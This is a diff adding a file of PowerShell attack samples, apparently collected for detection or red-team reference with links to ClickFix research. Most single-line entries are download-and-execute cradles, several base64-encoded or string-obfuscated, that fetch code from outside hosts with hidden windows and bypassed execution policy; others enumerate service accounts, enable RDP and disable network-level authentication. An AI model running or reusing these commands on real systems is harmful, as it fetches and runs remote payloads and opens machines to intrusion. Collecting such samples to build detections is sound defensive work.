@@ -1,0 +1,51 @@
+# References:
+# 
+# clickfix.carsonww.com
+# www.knowyouradversary.ru
+# posts.specterops.io
+# https://github.com/tobor88/PowerShell-Red-Team
+
+
+# Singleline Examples #
+#######################
+
+powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAYQBkAC4AcwBpAHQAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA
+
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('hxxp://87.120.219[.]26/P9m4H7S2FqDTof')"
+
+powershell.exe  -command "$search = New-Object DirectoryServices.DirectorySearcher([ADSI]''); $search.Filter = '(&(servicePrincipalName=*)(objectCategory=user))'; $results = $search.FindAll(); foreach ($result in $results) { $u = $result.GetDirectoryEntry(); Write-Host $u.name, $u.samaccountname; foreach ($s in $u.servicePrincipalName) { Write-Host $s; } Write-Host '---'; }"
+
+cmd.exe /c powershell -w h -ep Bypass -nop -c "$d='p.ps1';$y=$env:USERPROFILE+'\\Downloads\\'+$d;Start-Sleep 15;(New-Object Net.WebClient).DownloadFile('https://ghost.nestdns.com/files', $y);& $y;Remove-Item $y -Force;"
+
+powershell.exe -w h -nop -c "$kh='http'+'s';"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/';"$c='cVG'+'vQi'+'o6'+'.txt';"$om=$kh+$b+$c;$i='{0}{1}{2}' -f 'Net.','Web','Client';"$rf=New-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression $kj"
+
+
+
+# Multiline Examples #
+######################
+
+# Enable RDP
+Write-Verbose "Enabling RDP on $env:COMPUTERNAME"
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+
+Write-Verbose "Disabling NLA on $env:COMPUTERNAME"
+New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Force | Out-Null
+New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value "00000000" -PropertyType DWORD -Force
+
+Write-Verbose "Enabling RDP Firewall rule"
+Get-NetFirewallRule -DisplayGroup "Remote Desktop" | Set-NetFirewallRule -Enabled True
+
+
+# Get Logoff Events
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4634; StartTime=(Get-Date).AddDays(-30)} | %{
+    $Properties = $_.Properties
+    New-Object PSObject -Property @{
+        TimeCreatedUtc   = $_.TimeCreated.ToUniversalTime().ToString()
+        TimeCreatedLocal = $_.TimeCreated.ToLocalTime().ToString()
+        #TargetUserSid   = $Properties[0].Value.ToString()
+        TargetUserName   = $Properties[1].Value
+        TargetDomainName = $Properties[2].Value
+        TargetLogonId    = $Properties[3].Value
+        LogonType        = $Properties[4].Value.ToString()
+    }
+} | select TimeCreatedLocal,TimeCreatedUtc,TargetUserName,TargetDomainName,TargetLogonId,LogonType | ConvertTo-Csv -NoTypeInformation
